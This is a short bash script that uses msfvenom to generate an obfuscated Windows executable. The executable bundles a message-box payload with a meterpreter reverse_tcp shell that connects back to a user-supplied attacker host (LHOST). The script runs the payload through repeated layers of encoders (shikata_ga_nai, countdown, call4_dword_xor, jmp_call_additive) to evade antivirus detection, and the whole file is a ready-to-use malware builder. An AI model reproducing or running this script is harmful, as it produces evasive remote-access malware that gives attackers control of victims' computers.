#!/bin/bash

#######################################################
# Use MSFVenom to include payload "messagebox" and    #
#     "meterpreter_reverse_tcp" for windows           #
# usage: ./msfvenomscript.sh <LHOST>                  #
# developer: ptantiku                                 #
#######################################################

export LHOST=$1

msfvenom -p windows/messagebox -f raw EXITFUNC=thread > /tmp/msgbox.raw ; 
msfvenom -p windows/meterpreter/reverse_tcp -k -t /tmp/msgbox.raw -e x86/shikata_ga_nai -i 5 -f raw LHOST=$1 | \
msfvenom -p - -e x86/countdown -i 5 -f raw -a x86 --platform windows | \
msfvenom -p - -e x86/call4_dword_xor -i 5 -f raw -a x86 --platform windows | \
msfvenom -p - -e x86/jmp_call_additive -i 5 -f raw -a x86 --platform windows | \
msfvenom -p - -e x86/shikata_ga_nai -i 5 -f exe -a x86 --platform windows > x.exe
